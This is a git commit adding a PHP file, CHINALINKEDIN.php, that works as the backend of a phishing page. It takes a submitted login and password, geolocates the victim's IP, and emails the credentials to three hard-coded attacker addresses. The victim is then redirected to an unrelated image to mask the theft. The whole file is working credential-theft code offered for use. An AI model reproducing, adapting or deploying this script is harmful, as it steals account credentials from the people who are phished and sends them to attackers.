5759b7ab26a7cfd05644b5f7e8ba59b1b60930ef
Chriswills3559 <150385268+Chriswills3559@users.noreply.github.com>
2024-02-01 18:07:18 -0800

    Add files via upload

---
+++ CHINALINKEDIN.php
@@ -0,0 +1,151 @@
+<?php
+$country = visitor_country();
+$countryCode = visitor_countryCode();
+$continentCode = visitor_continentCode();
+$ip = getenv("REMOTE_ADDR");
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$login = $_POST['ai'];
+$passwd = $_POST['pr'];
+$own = 'javgadaffi@yandex.com,gadaffi@rambler.ru,shellly.xei@gmail.com';
+$web = $_SERVER["HTTP_HOST"];
+$inj = $_SERVER["REQUEST_URI"]; 
+$domain = 'JAVIER';
+$sender = 'JAV-|#GHOST';
+$subj = "1New Login | Country: $country";
+$headers .= "From: JAV GHOST<$sender>\n";
+$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
+$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
+$over = 'https://images.ctfassets.net/ifu905unnj2g/7HDBsWRHsAIYGmgMIocIMA/818f079f64ac5528004ac4b79faffadb/Purchase-Orders-Bench-Bookkeeping.png';
+$msg = "<HTML><BODY>
+ <TABLE>
+ <tr><td><b>**Chicharito Lambo**</b></td></tr>
+  <tr><td></td></tr>
+   <tr><td>==============================================================</td></tr>
+ <tr><td>Id: <b>$login</b><td/></tr>
+ <tr><td>Access: <b>$passwd</b></td></tr>
+ <tr><td>Country: $country | User IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
+
+ <tr><td>==============================================================</td></tr>
+ </BODY>
+ </HTML>";
+if (empty($login) || empty($passwd)) {
+header("Location: https://images.ctfassets.net/ifu905unnj2g/7HDBsWRHsAIYGmgMIocIMA/818f079f64ac5528004ac4b79faffadb/Purchase-Orders-Bench-Bookkeeping.png");
+}
+else {
+mail($own,$subj,$msg,$headers);
+header("Location: $over");
+}
+
+function visitor_country()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryName != null)
+    {
+        $result = $ip_data->geoplugin_countryName;
+    }
+
+    return $result;
+}
+function visitor_countryCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_countryCode != null)
+    {
+        $result = $ip_data->geoplugin_countryCode;
+    }
+
+    return $result;
+}
+function visitor_regionName()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_regionName != null)
+    {
+        $result = $ip_data->geoplugin_regionName;
+    }
+
+    return $result;
+}
+function visitor_continentCode()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+    $result  = "Unknown";
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+
+    if($ip_data && $ip_data->geoplugin_continentCode != null)
+    {
+        $result = $ip_data->geoplugin_continentCode;
+    }
+
+    return $result;
+}
+?>
